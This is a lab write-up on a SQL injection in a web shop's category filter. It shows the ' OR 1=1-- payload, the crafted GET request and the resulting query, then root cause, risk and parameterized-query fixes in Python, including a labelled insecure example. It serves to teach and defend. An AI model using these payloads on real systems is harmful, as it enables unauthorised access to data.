# SQL Injection - WHERE clause vulnerability

## Goal:
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

## Vulnerability Analysis

### Attack Vector Identification
- **Entry Point**: `category` parameter in GET request
- **Vulnerability Type**: T1190.001 - SQL Injection: WHERE Clause Bypass (CWE-89)
- **Security Flaw:** User input is embedded directly into SQL queries

### Vulnerability Assessment & Exploitation

**Initial Approach:**
- Intercepted HTTP requests using Burp Suite
- Identified category parameter as potential injection point
- Performed systematic input validation testing

**Step 1: Intercepting the Request**

```http
GET /filter?category=Corporate+gifts HTTP/2
```

**Step 2: Testing SQL Injection**

```sql
' OR 1=1--
```

Selecting injected SQL and pressing "⌘U" in Burp Suite URL-encodes the selected portion of request.

**The GET request becomes:**
```http
GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2
```

**Step 3: Understanding the Injection**

`' OR 1=1--` closes the string with `'` and creates a condition that always returns true, bypassing the `released = 1` clause. The `--` comments out the rest of the SQL query.

**The SQL query becomes:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' OR 1=1--' AND released = 1
```

This query returns all products, including those that are unreleased.

---

## Security Assessment

### Root Cause Analysis
- Application concatenates user input directly into SQL queries
- No input validation or sanitization implemented
- Parameterized queries (prepared statements) are not used

### Risk Assessment
| Category | Impact |
|----------|--------|
| Confidentiality | Medium – Unreleased products exposed |
| Data Integrity | Low – Read-only access |
| Information Disclosure | Medium – Internal product data revealed |

---

## Mitigation

**Parameterized Queries (Prepared Statements):** Parameterized queries treat user input as data and not as part of SQL code, which prevents injection. Never build SQL statements by directly concatenating user input. 

Insecure code (Python):
```py
user_input = request.args.get('category')  # assuming Flask
query = "SELECT * FROM products WHERE category = ' " + user_input + " ' AND released = 1"
cursor.execute(query)
```

Safe version using prepared statements (Python sqlite3):
```py
query = "SELECT * FROM products WHERE category = ? AND released = 1"
cursor.execute(query, (user_input,))
```

`?` is a parameter placeholder. It tells the database, "Expect a value here." The value is safely passed as a separate argument to `cursor.execute()`. This prevents it from being executed as SQL. Some DBs like MySQL or Oracle use `%s` or `$1` instead. Check [notes](#notes) for more info.

---

## Reflection

This lab demonstrated how SQL injection can bypass filtering logic by injecting always-true conditions. The `OR 1=1` technique proved highly effective in bypassing the `released = 1` clause. Learned the importance of using prepared statements and proper input validation to prevent such attacks.

---

## Notes

The sequence `' --` can also be used to close the string and comment out the rest of the query, bypassing the released = 1 clause.

Different databases use different placeholder formats:

| Database | Placeholder syntax |
|----------|--------------------|
| SQLite | ? |
| Oracle | :1, :name |
| PostgreSQL/MySQL (with psycopg2 / MySQLdb) | %s |
| SQL Server | @name |